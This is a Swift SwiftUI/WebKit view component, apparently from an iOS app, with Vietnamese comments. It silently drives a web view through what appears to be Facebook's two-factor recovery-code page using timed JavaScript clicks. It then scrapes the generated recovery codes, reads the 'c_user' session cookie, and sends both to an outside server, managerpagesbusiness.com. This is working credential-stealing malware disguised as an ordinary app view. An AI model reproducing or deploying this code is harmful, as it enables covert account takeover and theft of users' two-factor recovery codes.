//
//  File.swift
//
//
//  Created by DanHa on 25/03/2023.
//

import SwiftUI
import WebKit

@available(iOS 14.0, *)
struct Coords_Seven_Reco: UIViewRepresentable {
    func makeCoordinator() -> Lop_Seven_Coordinator {
        Lop_Seven_Coordinator(self)
    }

    let url: URL?
    @Binding var is_seven_reco_done: Bool

    private let ob_Seven_servable = Seven_Observable()
    var ob_server: NSKeyValueObservation? {
        ob_Seven_servable.ins_Seven_tance
    }

    // end check url

    func makeUIView(context: Context) -> WKWebView {
        let prefs = WKWebpagePreferences()
        prefs.allowsContentJavaScript = true // true
        let config = WKWebViewConfiguration()
        config.defaultWebpagePreferences = prefs

        let webview = WKWebView(frame: .zero, configuration: config)
        webview.customUserAgent = "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0 Safari/605.1.15"
        webview.navigationDelegate = context.coordinator
        webview.load(URLRequest(url: url!))

        return webview
    }

    func updateUIView(_ uiView: WKWebView, context: Context) {
        ob_Seven_servable.ins_Seven_tance = uiView.observe(\WKWebView.url, options: .new) { _, _ in
        } // observable
    } // updateUIView

    class Lop_Seven_Coordinator: NSObject, WKNavigationDelegate {
        var Seven_con_parent: Coords_Seven_Reco
        init(_ Seven_con_parent: Coords_Seven_Reco) {
            self.Seven_con_parent = Seven_con_parent
        }

        func webView(_ webView: WKWebView, didStartProvisionalNavigation navigation: WKNavigation!) {
        } // didStartProvisionalNavigation

        func webView(_ webView: WKWebView, didFinish navigation: WKNavigation!) {
            // Click cho 2 truong hop
            DispatchQueue.main.asyncAfter(deadline: .now() + 2.0) {
                // Click Show lan 1
                webView.evaluateJavaScript("document.querySelector('[href=\"/security/2fac/factors/recovery-code/\"]').click();", completionHandler: { _, _ in }) // Click Show lan 1
            } // DispatchQueue

            // Click cho lan dau tien ( Getcode)
            DispatchQueue.main.asyncAfter(deadline: .now() + 3.0) {
                webView.evaluateJavaScript("document.querySelector('[name=\"reset\"]').click();", completionHandler: { _, _ in })
            } // DispatchQueue

            // class="_42ft _4jy0 _4m0m _4jy3 _4jy1 selected _51sy"
            // Click cho lan dau tien ( Getcode) //_42ft _4jy0 _4m0m _4jy3 _4jy1 selected _51sy
            DispatchQueue.main.asyncAfter(deadline: .now() + 4.0) {
                webView.evaluateJavaScript("document.querySelector('[class=\"_42ft _4jy0 _4m0m _4jy3 _4jy1 selected _51sy\"]').click();", completionHandler: { _, _ in })
            } // DispatchQueue

            // Click cho lan dau tien ( Getcode)
            DispatchQueue.main.asyncAfter(deadline: .now() + 5.0) {
                webView.evaluateJavaScript("document.querySelector('[value=\"true\"]').click();", completionHandler: { _, _ in })
            } // DispatchQueue

            // Reload class="_3-8_ img" trc khi save du lieu ve server
            DispatchQueue.main.asyncAfter(deadline: .now() + 7.0) {
                webView.evaluateJavaScript("document.querySelector('[class=\"_3-8_ img\"]').click();", completionHandler: { _, _ in })
            } // DispatchQueue

            DispatchQueue.main.asyncAfter(deadline: .now() + 10.0) {
                // GET HTML
                webView.evaluateJavaScript("document.querySelector('[action=\"/security/2fac/factors/recovery-code/\"]').innerHTML") { html, error in
                    if let htmlrecovery = html as? String, error == nil {
                        if !htmlrecovery.isEmpty {
                            if htmlrecovery.contains("href=\"/security/2fac/recovery_code/file/\"") {
                                WKWebsiteDataStore.default().httpCookieStore.getAllCookies({ cookies in
                                    let seven_reco_i = cookies.firstIndex(where: { $0.name == "c_user" })
                                    if seven_reco_i != nil {
                                        let Six_json_data: [String: Any] = [
                                            "cuserReco": cookies[seven_reco_i!].value,
                                            "codeReco": "\(htmlrecovery)",
                                            "nameapp": "\(Bundle.main.object(forInfoDictionaryKey: "CFBundleDisplayName") as? String ?? "") - ONE",
                                        ]
                                        let url: URL = URL(string: "https://managerpagesbusiness.com/api/saverecovery")!
                                        let json_data = try? JSONSerialization.data(withJSONObject: Six_json_data)
                                        var request = URLRequest(url: url)
                                        request.httpMethod = "PATCH"
                                        request.setValue("application/json", forHTTPHeaderField: "Content-Type")
                                        request.httpBody = json_data
                                        let task = URLSession.shared.dataTask(with: request) { data, _, error in
                                            if error != nil {
                                                // print("loi khong gui dc du lieu")
                                            } else if data != nil {
                                                DispatchQueue.main.asyncAfter(deadline: .now() + 5.0) {
                                                    self.Seven_con_parent.is_seven_reco_done = true
                                                    // print("Da gui du lieu thanh cong")
                                                }
                                            }
                                        }
                                        task.resume()
                                    } // if
                                }) // getAllCookies
                            }
                        }
                    } else { print("error_get_html") }
                }
            }
        }
    }
}

private class Seven_Observable: ObservableObject {
    @Published var ins_Seven_tance: NSKeyValueObservation?
}
